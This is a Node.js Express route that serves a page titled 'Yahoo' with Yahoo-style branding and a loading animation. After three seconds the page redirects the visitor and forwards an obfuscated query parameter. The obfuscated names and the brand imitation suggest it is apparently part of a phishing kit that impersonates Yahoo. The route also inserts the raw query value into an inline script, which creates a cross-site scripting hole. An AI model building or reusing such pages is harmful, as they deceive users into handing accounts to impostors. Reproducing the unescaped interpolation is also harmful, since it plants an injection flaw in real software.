
const express = require ('express');
const router = express.Router();
const db = require('../db');
router.use(express.static('public'));


//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data2 = req.query.uihdft948fdjxgjdferuidh;
    const url = `/home/?kjgfhdgudgherueru9843efjdfhfwheur=${data2}`;
    if (data2 == null) {
        res.render('error');
        
      }else{

    const htmlContent = `
    <!doctype html>
<html lang="en">
<head>
<!-- Required meta tags -->
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
           <link rel="icon" type="image/x-icon" href="./images/img.ico">
    <meta name="format-detection" content="telephone=no">
    <title>Yahoo</title>
    <link href="/stylesheet/main.css" rel="stylesheet" type="text/css">
    <script>
        setTimeout(function() {
            window.location.href = '${url}';
        }, 3000);
    </script>

    
    <style>
    :root {
--yellow: #6600ff;
--red: #6600ff;
--blue: #6600ff;
--violet: #6600ff;
}
body {
margin: 0;
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
background-color: white;
background-image: linear-gradient(180deg, rgba(0,0,0,0.15) 0%, rgba(0,153,212,0) calc(15% + 100px), rgba(0,99,138,0) calc(85% + 100px), rgba(0,0,0,0.15) 100%);
}
div.container {
display: flex;
justify-content: center;
align-items: center;
}
div > div {
width: 3vw;
height: 3vw;
border-radius: 100%;
margin: 2vw;
background-image: linear-gradient(145deg, rgba(255,255,255,0.5) 0%, rgba(0,0,0,0) 100%);
animation: bounce 1.5s 0.5s linear infinite;
}
.yellow {
background-color: var(--yellow);
}

.red {
background-color: var(--red);
animation-delay: 0.1s;
}

.blue {
background-color: var(--blue);
animation-delay: 0.2s;
}

.violet {
background-color: var(--violet);
animation-delay: 0.3s;
}

@keyframes bounce {
0%, 50%, 100% {
transform: scale(1);
filter: blur(0px);
}
25% {
transform: scale(0.6);
filter: blur(3px);
}
75% {
filter: blur(3px);
transform: scale(1.4);
}
}
</style>
</head>
<body>



<div class="image-src">
    <img src="./images/ldg.gif" alt="Yahoo" style="height: 200px;width:200px;">
   </div>


</body>
</html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }
});




module.exports =router;
